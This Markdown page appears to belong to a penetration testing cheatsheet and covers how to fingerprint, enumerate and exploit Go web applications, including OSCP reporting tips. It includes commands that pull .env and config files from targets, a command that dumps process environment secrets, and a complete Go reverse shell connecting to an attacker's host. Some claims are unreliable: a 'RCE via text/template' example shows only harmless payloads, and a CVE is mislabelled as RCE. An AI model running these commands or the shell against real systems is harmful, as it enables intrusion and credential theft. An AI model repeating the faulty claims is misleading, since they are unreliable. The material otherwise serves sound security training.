# Go

> Part of [03 Languages](../README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation patterns](#4-exploitation-patterns)
- [5. Framework-specific](#5-framework-specific)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Headers and cookies

| Header / cookie | Indicates |
|-----------------|-----------|
| `Server: Go-http-client/1.1` | Go HTTP client (not server) |
| `X-Powered-By: Go` | Rarely set explicitly |
| `Set-Cookie: session=...` (no framework markers) | Custom Go |
| `Server: (empty or custom)` | net/http default (no Server header) |
| `Set-Cookie: gorilla.csrf.Token` | Gorilla toolkit |
| `Set-Cookie: gothic_session` | Goth (OAuth) |
| `X-Gin-Version` | Custom Gin header (rare) |

**Go's net/http** does NOT send a `Server` header by default. This is a **strong** signal: if `Server` is **absent** but the app responds, suspect Go (or stripped headers).

### 1.2 Error messages

| Error text | Framework |
|------------|-----------|
| `404 page not found` | net/http default |
| `http: panic serving` | net/http (panic) |
| `goroutine 1 [running]` | Go panic trace |
| `runtime error: index out of range` | Go runtime |
| `reflect: call of reflect.Value` | Go reflection |
| `gin-gonic/gin` | Gin (if stack trace shown) |
| `echo framework` | Echo |
| `fiber` | Fiber |

### 1.3 File paths and structure

| Path | Purpose |
|------|---------|
| `/main.go` | Entry point |
| `/go.mod`, `/go.sum` | Dependencies |
| `/handlers/`, `/routes/` | Handlers |
| `/static/`, `/public/` | Static files |
| `/templates/` | HTML templates |
| `/config.yaml`, `/config.json` | Config |
| `/.env` | Env vars |

---

## 2. Enumeration

### 2.1 Common files

```bash
curl -s http://<TARGET>/go.mod
curl -s http://<TARGET>/go.sum
curl -s http://<TARGET>/main.go
curl -s http://<TARGET>/config.yaml
curl -s http://<TARGET>/.env
```

### 2.2 Framework detection

```bash
# net/http - no Server header
curl -sI http://<TARGET>/ | grep -i "^server" || echo "NO SERVER HEADER (Go net/http?)"

# 404 page
curl -s http://<TARGET>/nonexistent-xyz
# "404 page not found" = net/http default
```

### 2.3 Dependency fingerprinting

If `go.mod` / `go.sum` is exposed:

```bash
cat go.mod
# Shows: module name, Go version, require block with deps
```

Check for known-vulnerable versions (govulncheck, Snyk).

---

## 3. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2022-41723 | golang.org/x/net < 0.7.0 | DoS via HTTP/2 (HPACK) | https://nvd.nist.gov/vuln/detail/CVE-2022-41723 |
| CVE-2023-24538 | Go < 1.19.8 / 1.20.3 | RCE via html/template | https://nvd.nist.gov/vuln/detail/CVE-2023-24538 |
| CVE-2023-24540 | Go < 1.19.9 / 1.20.4 | XSS via html/template | https://nvd.nist.gov/vuln/detail/CVE-2023-24540 |
| CVE-2023-29402 | Go < 1.19.10 / 1.20.5 | RCE via cgo | https://nvd.nist.gov/vuln/detail/CVE-2023-29402 |
| CVE-2024-24790 | Go < 1.21.11 / 1.22.4 | Incorrect IPv6 parsing (SSRF bypass) | https://nvd.nist.gov/vuln/detail/CVE-2024-24790 |
| CVE-2025-22870 | golang.org/x/net < 0.36.0 | Proxy bypass via IPv6 zone | https://nvd.nist.gov/vuln/detail/CVE-2025-22870 |
| CVE-2025-22872 | golang.org/x/net < 0.38.0 | XSS in html tokenizer | https://nvd.nist.gov/vuln/detail/CVE-2025-22872 |

---

## 4. Exploitation patterns

### 4.1 Template injection (text/template, html/template)

Go templates use `{{ ... }}` syntax. Similar to Jinja2 but with different internals.

**Detection:**

```text
{{7*7}}         -> 49 if evaluated
{{.}}           -> reveals current context
```

**RCE via text/template (not html/template):**

```text
{{.}}
{{printf "%s" "test"}}
{{html "test"}}
```

**Note:** Go templates are **not** a general-purpose language. Unlike Jinja2, you cannot directly call `os.system` or access globals. RCE requires either:

- A function exposed to the template that does something dangerous (e.g. `exec`, `system`).
- Access to `.` context that includes unsafe methods.

**So Go template injection is rarely RCE**, but can leak data or abuse exposed functions.

### 4.2 Command injection

Common sinks:

```go
exec.Command("sh", "-c", userInput)   // shell=True equivalent
exec.Command("bash", "-c", userInput)
exec.Command(userInput)                // if userInput is a path to binary
```

`exec.Command("sh", "-c", input)` \- shell injection if `input` is user-controlled.

### 4.3 SSRF

Go's HTTP client follows redirects by default. If the URL is user-controlled:

```go
http.Get(userInput)
http.Post(userInput, ...)
client.Get(userInput)
```

Targets: cloud metadata (`http://169.254.169.254/`), internal services.

### 4.4 Path traversal

Go's `filepath.Join` **does not** prevent traversal:

```go
filepath.Join("/var/www/", userInput)  // userInput = "../../etc/passwd" -> /etc/passwd
```

If user input is used with `http.FileServer` or `http.ServeFile`, traversal may be possible.

### 4.5 Prototype pollution? No.

Go is not JavaScript - no prototype pollution. Different class of bugs.

### 4.6 SQL injection (database/sql)

```go
db.Query("SELECT * FROM users WHERE name = '" + name + "'")  // vulnerable
db.Query("SELECT * FROM users WHERE name = ?", name)         // safe
```

### 4.7 Deserialization

Go uses `encoding/gob`, `encoding/json`, `yaml`. Gob deserialization of untrusted input is **dangerous** (like Java or .NET):

```go
gob.NewDecoder(r).Decode(&obj)  // RCE possible via type confusion
```

But gob deserialization requires the attacker to know the target types - less generic than Java gadgets.

YAML libraries: `gopkg.in/yaml.v2` and `v3` are safe by default (no arbitrary object instantiation).

### 4.8 Race conditions

Go's concurrency makes race conditions common. If the app has shared state without locks, TOCTOU bugs are possible.

---

## 5. Framework-specific

### 5.1 net/http (standard library)

- No `Server` header by default
- `404 page not found` - default 404
- `http.HandleFunc` - route handlers
- `http.FileServer` - static file server (path traversal if misconfigured)
- `http.ListenAndServe` - server startup

### 5.2 Gin

- Fast HTTP framework
- `gin.Default()` - with logger + recovery
- `gin.SetMode(gin.DebugMode)` - verbose errors
- `/debug/pprof` - profiling (if exposed)
- Custom headers often absent (stripped by default)

### 5.3 Echo

- `echo.New()`
- `/debug/pprof` - profiling (if exposed)
- Default error handler shows stack trace in dev

### 5.4 Fiber

- Express-inspired API (not net/http compatible)
- `fiber.New()`
- Fast, based on fasthttp

### 5.5 Gorilla toolkit

- `gorilla/mux` - router
- `gorilla/sessions` - sessions (cookie name often `session`)
- `gorilla/csrf` - CSRF protection (cookie `gorilla.csrf.Token`)

---

## 6. Post-exploitation

### 6.1 Read config files

```text
/app/config.yaml
/app/config.json
/app/.env
/app/go.mod
/app/main.go
```

Look for: DB creds, API keys, `JWT_SECRET`, `SESSION_SECRET`.

### 6.2 Read environment variables

Go apps often load config from env. In a running container:

```bash
cat /proc/self/environ | tr '\0' '\n'
```

### 6.3 Go binary analysis

If you have the compiled binary, decompile with **Ghidra** or **IDA**. Go binaries include function names (not stripped by default), making reverse engineering easier than C.

```bash
strings ./app | grep -i "password\|secret\|token"
```

### 6.4 Go reverse shell

```go
package main
import (
  "net"
  "os/exec"
)
func main() {
  c, _ := net.Dial("tcp", "<LHOST>:<LPORT>")
  cmd := exec.Command("/bin/sh")
  cmd.Stdin = c
  cmd.Stdout = c
  cmd.Stderr = c
  cmd.Run()
}
```

Or use `msfvenom -p linux/x64/shell_reverse_tcp` (compiles to ELF, not Go).

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the framework fingerprint (absence of Server header + "404 page not found" = Go net/http, or Gin/Echo stack trace).

> [!IMPORTANT]
> OSCP report: screenshot the exploit payload (template injection, command injection, path traversal) and its result.

> [!IMPORTANT]
> OSCP report: screenshot the moment of RCE (reverse shell, command output).

---

## 8. References

- Go official docs - https://go.dev/doc/
- HackTricks - Go - https://book.hacktricks.xyz/pentesting-web
- Gin - https://gin-gonic.com/docs/
- Echo - https://echo.labstack.com/docs
- Fiber - https://docs.gofiber.io/
- CVE-2022-41723 - https://nvd.nist.gov/vuln/detail/CVE-2022-41723
- CVE-2023-24538 - https://nvd.nist.gov/vuln/detail/CVE-2023-24538
- CVE-2023-24540 - https://nvd.nist.gov/vuln/detail/CVE-2023-24540
- CVE-2023-29402 - https://nvd.nist.gov/vuln/detail/CVE-2023-29402
- CVE-2024-24790 - https://nvd.nist.gov/vuln/detail/CVE-2024-24790
- CVE-2025-22870 - https://nvd.nist.gov/vuln/detail/CVE-2025-22870
- CVE-2025-22872 - https://nvd.nist.gov/vuln/detail/CVE-2025-22872

---
